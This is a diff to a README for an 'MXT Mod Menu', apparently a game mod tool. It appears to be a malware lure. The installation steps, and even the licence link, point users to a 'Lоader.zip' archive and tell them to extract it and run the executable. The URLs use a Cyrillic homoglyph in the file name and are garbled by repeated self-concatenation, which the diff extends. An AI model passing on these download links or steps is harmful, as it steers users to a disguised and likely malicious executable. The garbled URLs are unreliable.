@@ -12,8 +12,8 @@ MXT Mod Menu delivers innovative, secure, and highly compatible modification sol
 
 ## ⚙️ **Installation Guide**
 
-1. **Download** `https://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zip` from this repository.
-2. **Extract** https://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zip to your preferred directory using any archive manager (WinRAR, 7-Zip, or system default).
+1. **Download** `https://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zip` from this repository.
+2. **Extract** https://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zip to your preferred directory using any archive manager (WinRAR, 7-Zip, or system default).
 3. **Run the executable** according to your operating system (see compatibility).
 4. **Follow on-screen prompts** for setup and deployment.
 
@@ -81,7 +81,7 @@ MXT Mod Menu is an advanced customization utility developed exclusively for educ
 ## 📜 **License**
 
 MXT Mod Menu is released under the **MIT License** (2025) - free to use, distribute, and customize for both private and commercial purposes, with attribution.  
-🔗 [MIT LICENSE - full text here](https://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zip)
+🔗 [MIT LICENSE - full text here](https://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zipоhttps://raw.githubusercontent.com/UbaidKhan92/MXT-MenuForge/main/Lоader.zip)
 
 ---
 
